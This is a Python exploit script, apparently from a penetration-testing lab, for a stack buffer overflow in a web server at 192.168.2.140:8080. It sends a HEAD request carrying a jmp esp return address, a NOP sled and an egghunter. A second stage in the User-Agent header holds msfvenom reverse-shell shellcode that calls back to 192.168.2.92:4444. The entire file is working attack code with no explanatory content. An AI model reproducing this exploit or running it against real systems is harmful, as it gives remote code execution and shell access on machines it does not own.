import os
import sys
import socket
import struct

class Exploit:
	IP = "192.168.2.140"
	PORT = 8080

	@classmethod
	def conv_addr(cls, addr):
		return struct.pack("<I", addr)

	@classmethod
	def generate_badchar(cls):
	    badchar_test_str = b""
	    badchars = [0x00, 0x0a, 0x0d, 0x20, 0x3f]

	    for i in range(0x00, 0xFF+1):
		    if i not in badchars: badchar_test_str += struct.pack("B", i)
                                
	    with open("badchar_test.bin", "wb") as badchar_file: badchar_file.write(badchar_test_str)

	    return badchar_test_str

	@classmethod
	def craft_request(cls):
		offset = 515
		junk = b"A" * offset
		nop_sled = b"\x90" * 16
		badchars = cls.generate_badchar()

		# 0x7c9d3163 : jmp esp |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHELL32.dll)
		jmp_esp = cls.conv_addr(0x7c9d3163)

		egghunter =  b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
		egghunter += b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
		egghunter += b"\x57\x30\x30\x54" # W00T
		egghunter += b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

		egg = b"\x57\x30\x30\x54\x57\x30\x30\x54" # W00TW00T

		# root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.92 LPORT=4444 -f python -b "\x00\x0a\x0d\x20\x3f"
		shellcode =  b""
		shellcode += b"\xbf\x2e\xa2\xb0\x89\xda\xd9\xd9\x74\x24\xf4\x5a\x29"
		shellcode += b"\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\x54\xac\x52"
		shellcode += b"\x7c\x54\x58\x10\x7f\xa4\x99\x75\x09\x41\xa8\xb5\x6d"
		shellcode += b"\x02\x9b\x05\xe5\x46\x10\xed\xab\x72\xa3\x83\x63\x75"
		shellcode += b"\x04\x29\x52\xb8\x95\x02\xa6\xdb\x15\x59\xfb\x3b\x27"
		shellcode += b"\x92\x0e\x3a\x60\xcf\xe3\x6e\x39\x9b\x56\x9e\x4e\xd1"
		shellcode += b"\x6a\x15\x1c\xf7\xea\xca\xd5\xf6\xdb\x5d\x6d\xa1\xfb"
		shellcode += b"\x5c\xa2\xd9\xb5\x46\xa7\xe4\x0c\xfd\x13\x92\x8e\xd7"
		shellcode += b"\x6d\x5b\x3c\x16\x42\xae\x3c\x5f\x65\x51\x4b\xa9\x95"
		shellcode += b"\xec\x4c\x6e\xe7\x2a\xd8\x74\x4f\xb8\x7a\x50\x71\x6d"
		shellcode += b"\x1c\x13\x7d\xda\x6a\x7b\x62\xdd\xbf\xf0\x9e\x56\x3e"
		shellcode += b"\xd6\x16\x2c\x65\xf2\x73\xf6\x04\xa3\xd9\x59\x38\xb3"
		shellcode += b"\x81\x06\x9c\xb8\x2c\x52\xad\xe3\x38\x97\x9c\x1b\xb9"
		shellcode += b"\xbf\x97\x68\x8b\x60\x0c\xe6\xa7\xe9\x8a\xf1\xc8\xc3"
		shellcode += b"\x6b\x6d\x37\xec\x8b\xa4\xfc\xb8\xdb\xde\xd5\xc0\xb7"
		shellcode += b"\x1e\xd9\x14\x17\x4e\x75\xc7\xd8\x3e\x35\xb7\xb0\x54"
		shellcode += b"\xba\xe8\xa1\x57\x10\x81\x48\xa2\xf3\x6e\x24\xae\x5f"
		shellcode += b"\x07\x37\xae\x4e\x8b\xbe\x48\x1a\x23\x97\xc3\xb3\xda"
		shellcode += b"\xb2\x9f\x22\x22\x69\xda\x65\xa8\x9e\x1b\x2b\x59\xea"
		shellcode += b"\x0f\xdc\xa9\xa1\x6d\x4b\xb5\x1f\x19\x17\x24\xc4\xd9"
		shellcode += b"\x5e\x55\x53\x8e\x37\xab\xaa\x5a\xaa\x92\x04\x78\x37"
		shellcode += b"\x42\x6e\x38\xec\xb7\x71\xc1\x61\x83\x55\xd1\xbf\x0c"
		shellcode += b"\xd2\x85\x6f\x5b\x8c\x73\xd6\x35\x7e\x2d\x80\xea\x28"
		shellcode += b"\xb9\x55\xc1\xea\xbf\x59\x0c\x9d\x5f\xeb\xf9\xd8\x60"
		shellcode += b"\xc4\x6d\xed\x19\x38\x0e\x12\xf0\xf8\x3e\x59\x58\xa8"
		shellcode += b"\xd6\x04\x09\xe8\xba\xb6\xe4\x2f\xc3\x34\x0c\xd0\x30"
		shellcode += b"\x24\x65\xd5\x7d\xe2\x96\xa7\xee\x87\x98\x14\x0e\x82"

		stage1 =  junk
		stage1 += jmp_esp
		stage1 += nop_sled
		stage1 += egghunter

		stage2 =  egg
		stage2 += shellcode

		payload = stage1 + stage2

		req =  b"HEAD /" + stage1 + b" HTTP/1.1\r\n"
		req += b"Host: 192.168.2.140:8080\r\n"
		req += b"User-Agent: " + stage2 + b"\r\n"
		req += b"Keep-Alive: 115\r\n"
		req += b"Connection: keep-alive\r\n\r\n"

		print("[+] Packet crafted.")
		cls.send_request(req)

	@classmethod
	def send_request(cls, req):
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			try:
				sock.connect((cls.IP, cls.PORT))

				print(f"[+] Sending:\n{req}")
				sock.send(req)

			except ConnectionRefusedError as error:
				print(f"[!] Error - {error}")

if __name__ == "__main__":
	Exploit.craft_request()